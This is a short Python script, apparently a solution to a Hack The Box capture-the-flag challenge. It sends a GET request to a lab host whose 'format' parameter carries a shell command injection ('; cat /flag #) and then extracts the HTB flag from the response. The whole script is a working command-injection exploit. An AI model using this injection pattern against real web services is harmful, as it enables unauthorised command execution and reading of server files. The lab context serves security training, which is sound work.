#!/usr/bin/env python

import requests
import re

url = "http://10.10.10.10:1337/"

r = requests.get(
    url,
    params={
    "format": "'; cat /flag #"
    },
)

m = re.search(r"HTB{.*?}", r.text)
if m:
    print(m.group())
else:
    print("[-] we failed to find the flag")
